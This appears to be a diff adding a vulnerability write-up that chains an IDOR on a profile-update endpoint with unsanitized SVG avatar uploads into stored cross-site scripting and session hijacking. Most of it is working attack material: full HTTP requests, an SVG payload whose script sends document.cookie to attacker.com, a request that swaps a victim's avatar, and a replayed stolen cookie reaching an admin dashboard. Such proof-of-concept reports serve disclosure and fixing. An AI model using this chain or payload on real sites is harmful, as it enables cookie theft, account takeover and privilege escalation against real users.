@@ -1,0 +1,59 @@
+Low bug #2 details
+
+    Endpoint: PUT /api/v1/user/profile
+
+    Issue: No check that user_id in body matches session user.
+
+Low bug #3 details
+
+    Endpoint: POST /api/v1/user/avatar (accepts .svg)
+
+    Issue: No sanitization of SVG; no CSP on profile view.
+
+Exploit chain
+Step 1 – Attacker uploads malicious SVG as own avatar
+http
+
+POST /api/v1/user/avatar HTTP/1.1
+Host: target.com
+Authorization: Bearer <attacker_session>
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="avatar"; filename="evil.svg"
+Content-Type: image/svg+xml
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+    fetch('https://attacker.com/steal?cookie=' + document.cookie);
+  </script>
+</svg>
+------WebKitFormBoundary--
+
+Step 2 – Change victim’s avatar to attacker’s SVG using IDOR
+http
+
+PUT /api/v1/user/profile HTTP/1.1
+Host: target.com
+Authorization: Bearer <attacker_session>
+Content-Type: application/json
+
+{
+  "user_id": "victim_456",
+  "avatar_url": "/uploads/avatars/evil.svg"
+}
+
+Step 3 – Victim visits own profile
+
+    GET /profile/victim_456 → loads SVG → script executes.
+
+    Victim’s session cookie sent to attacker.
+
+Step 4 – Attacker hijacks session
+http
+
+GET /api/v1/admin/dashboard HTTP/1.1
+Host: target.com
+Cookie: session=<victim_session_cookie>
+
+✅ Result: Privilege escalation to admin if victim is admin.
